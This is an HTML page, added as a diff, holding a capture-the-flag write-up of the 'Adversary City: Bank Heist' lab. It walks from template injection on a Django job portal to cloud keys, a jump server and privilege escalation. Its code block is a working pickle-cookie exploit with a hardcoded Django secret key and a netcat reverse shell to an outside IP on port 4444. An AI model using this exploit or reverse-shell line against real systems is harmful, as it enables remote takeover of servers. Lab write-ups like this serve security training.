@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <link rel="stylesheet" href="css/blog.css  ">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>adversary city</title>
+
+
+</head>
+
+<body>
+    <header>
+        <h1>Adversary City: The Bank Heist.</h1>
+    </header>
+
+    <div class="wrapper">
+        <div class="container">
+            <p>
+                We access the bank web page.
+            </p>
+            <img src="img/BANK (2).png" alt="Log file details" style="width: 100%; max-width: 600px;" > <br>
+
+            <img src="img/h1.png" alt="Log file details" style="width: 100%; max-width: 600px;" > <br>
+
+            <p>
+                Accessing jobs link leads to port 8080 job portal managed by a 3rd party.
+                SSTI found on job search bar
+            </p>
+            <img src="img/h2.png" alt="Log file details" style="width: 100%; max-width: 600px;" > <br>
+
+            <p>
+                Its a django app and ssti leaked django secret key.
+
+                Using this secret key we craft a rce payload and paste in the session cookie which gives us a
+                reverse shell on the web server.
+            </p>
+            <p>Public exploit available for django pickle rce
+                <a href="https://github.com/0xuf/DJRCE.git">https://github.com/0xuf/DJRCE.git</a>
+
+                Custom exploit is given below
+            </p>
+
+            <pre>
+                    import os
+                    import sys
+                    from django.contrib.sessions import serializers
+                    from django.core.signing import loads, dumps, BadSignature
+                    try:
+                    import cPickle as pickle
+                    except:
+                    import pickle
+                    os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'settings')
+                    SECRET_KEY = "*yne&!o+c&nc)06jjr^jr^&+62ni=ugy1(d4$q55-(xb3#58qt"
+                    def __reduce__(self):
+                    return os.system, ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 54.209.27.50 4444
+                    >/tmp/f",)
+                    Poc = type(
+                    "POC",
+                    (object,),
+                    {"__reduce__": __reduce__}
+                    )
+                    COOKIE = ...
+
+                    try:
+                    new_content = loads(COOKIE, key=SECRET_KEY, serializer=serializers.PickleSerializer,
+
+                    salt='django.contrib.sessions.backends.signed_cookies')
+
+                    except BadSignature:
+                    print("SECRET_KEY does not match the sample cookie")
+                    sys.exit()
+                    new_content['testcookie'] = Poc()
+                    payload = dumps(new_content, key=SECRET_KEY, serializer=serializers.PickleSerializer,
+                    salt='django.contrib.sessions.backends.signed_cookies', compress=True)
+                    print(f"Payload -> {payload}")
+
+                </pre>
+
+                <img src="img/h3.png" alt="Log file details" style="width: 100%; max-width: 600px;" > <br>
+                <img src="img/h4.png" alt="Log file details" style="width: 100%; max-width: 600px;" > <br>
+
+
+            <p>After gaining access to the server via RCE, checked the flag.</p>
+
+            <img src="img/h5.png" alt="Log file details" style="width: 100%; max-width: 600px;" > <br>
+            <img src="img/h6.png" alt="Log file details" style="width: 100%; max-width: 600px;" > <br>
+
+
+
+            <p> <strong>Flag1 - PickleRCE - > AdversaryVillage{B4NKAPP_C0MPR0MIS3D!}</strong>
+                Then continued enumeration on the server and found a hosts file which prod ip and second flag.</p>
+                <img src="img/h7.png" alt="Log file details" style="width: 100%; max-width: 600px;" > <br>
+                <img src="img/h8.png" alt="Log file details" style="width: 100%; max-width: 600px;" > <br>
+
+
+            <p> <strong>Flag2 - hosts -> AdversaryVillage{PRODUCTION_VM_IP_F0R_FUTUR3!}</strong>
+
+                The ip couldn’t be pinged from the server, so checked for other options and tried metadata
+                endpoint.</p>
+                <img src="img/h9.png" alt="Log file details" style="width: 100%; max-width: 600px;" > <br>
+
+            <p>Using the keys , listed</p>
+            <img src="img/h10.png" alt="Log file details" style="width: 100%; max-width: 600px;" > <br>
+
+
+            <p> <strong>Flag3 - Lambda -> AdversaryVillage{L4MD4_FUNCTION_FOR_PROFIT}</strong>
+
+                From lambda we get a jump server ip and credentials, SSHing to the server we get a flag from
+                the user’s home dir.</p>
+
+                <img src="img/h11.png" alt="Log file details" style="width: 100%; max-width: 600px;" > <br>
+
+
+            <p> <strong>Flag4 - Home jump -> AdversaryVillage{JUMP_VM_0WN3D}</strong>
+
+                Enumerate more on the jump vm and found a kube related file which have another flag and
+                details about prod-user.</p>
+
+                <img src="img/h12.png" alt="Log file details" style="width: 100%; max-width: 600px;" > <br>
+
+
+            <p> <strong>Flag5 - kube properties -> AdversaryVillage{CLUST3R_ENV_EXF1LTR4T3D}</strong>
+
+                SSHing to prod vm which we got earlier give us another flag.
+
+               <strong> Flag6 - Home Prod -> AdversaryVillage{PR0D_VM_C0MPROMIS3D!}</strong></p>
+
+                <img src="img/h13.png" alt="Log file details" style="width: 100%; max-width: 600px;" > <br>
+
+
+            <p>Then enumerate more on system and found a SUID binary with interesting name.</p>
+            <img src="img/h14.png" alt="Log file details" style="width: 100%; max-width: 600px;" > <br>
+
+            <p>Using privileged mode of bash give us access to ansible_user’s home directory which have flag.</p>
+
+            <img src="img/h15.png" alt="Log file details" style="width: 100%; max-width: 600px;" > <br>
+            <img src="img/h16.png" alt="Log file details" style="width: 100%; max-width: 600px;" > <br>
+
+            <p><strong>Flag7 - Privesc -> AdversaryVillage{PR1V1L3GE_ESC4L4T10N!}</strong>
+                Checking the bash file give us a google sheet id</p>
+                <img src="img/h17.png" alt="Log file details" style="width: 100%; max-width: 600px;" > <br>
+
+            <p>Pasting it in sheets url gives us the final flag.</p>
+            <img src="img/h18.png" alt="Log file details" style="width: 100%; max-width: 600px;" > <br>
+
+            <p><strong>Flag8 -> sheets -> AdversaryVillage{3XFILTRAT3D_CR1T1C4L_1NF0}</strong></p>
+
+        </div>
+    </div>
+    <footer>
+        <p>&copy; 2024 Adversary Village. All rights reserved. | <a href="#">Contact Us</a></p>
+    </footer>
+</body>
+
+</html>
